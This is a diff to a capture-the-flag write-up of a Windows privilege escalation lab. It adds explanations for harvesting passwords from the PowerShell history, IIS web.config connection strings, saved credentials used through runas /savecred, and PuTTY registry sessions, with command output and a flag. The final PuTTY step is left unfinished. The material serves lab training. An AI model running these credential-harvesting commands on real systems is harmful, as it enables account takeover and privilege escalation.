@@ -11,6 +11,10 @@ This writeup was last updated: 08/11/2023
 # Room Tasks
 
 ## Harvesting Passwords From Usual Spots
+
+### PowerShell History
+1. Started up this task's machine
+2. `type %userprofile%\<ConsoleHost_history.txt FILE LOCATION>` from our compromised Windows machine to display the the contents of our current user's `ConsoleHost_history.txt` file, which revealed to us the password for the julia.jones user since this file contains the user's PowerShell commands history
 ```PowerShell
 C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ls
@@ -26,6 +30,9 @@ cmdkey /list
 runas /?
 ```
 
+### Internet Information services (IIS) Configuration
+1. Started up this task's machine
+2. `type <IIS WEB CONFIGURATION FILE LOCATION> | findstr connectionString` from our compromised Windows machine to display the lines of Internet Information Services (IIS) `web.config` file containing the string "connectionString" onto our terminal, which revealed to us the set of credentials for the "db_admin" user since this configuration file usually store passwords for databases or configured authentication mechanisms
 ```PowerShell
 C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
@@ -35,6 +42,9 @@ C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\
     </connectionStrings>
 ```
 
+### Saved Windows Credentials
+1. Started up this task's machine
+2. `cmdkey /list` from the compromised Windows machine to display a list of all credentials that are currently saved on the local machine, which revealed another user's username
 ```PowerShell
 C:\Users\thm-unpriv>cmdkey /list
 
@@ -45,11 +55,11 @@ Currently stored credentials:
     User: WPRIVESC1\mike.katz
 ```
 
+3. `runas /savedcred /user:<USER> <COMMAND>` from our compromised Windows machine to run a command and open up a terminal as the user that we just previously discovered using their credentials that are already stored on the local system
 ```PowerShell
 C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
 Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
 ```
-
 ```PowerShell
 Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -57,10 +67,12 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
+4. `cd <ROOT DIRECTORY>` from the previously opened terminal on our compromised Windows machine to change to the machine's root directory 
 ```PowerShell
 C:\Windows\system32>cd C:\
 ```
 
+5. `dir /s <FILENAME>` from the previously opened terminal on our compromised Windows machine in order to recursively search through the machine's filesystem for the file containing this task's flag, which ended up finding and displaying its location onto our terminal
 ```PowerShell
 C:\>dir /s flag.txt
  Volume in drive C has no label.
@@ -76,11 +88,15 @@ C:\>dir /s flag.txt
                0 Dir(s)  14,781,849,600 bytes free
 ```
 
+6. `type <FILE PATH>` from the previously opened terminal on our compromised Windows machine to display this task's flag 
 ```PowerShell
 C:\>type C:\Users\mike.katz\Desktop\flag.txt
 THM{WHAT_IS_MY_PASSWORD}
 ```
 
+### Retrieve Credentials from PuTTY
+1. Started up this task's machine
+2. 
 ```PowerShell
 C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
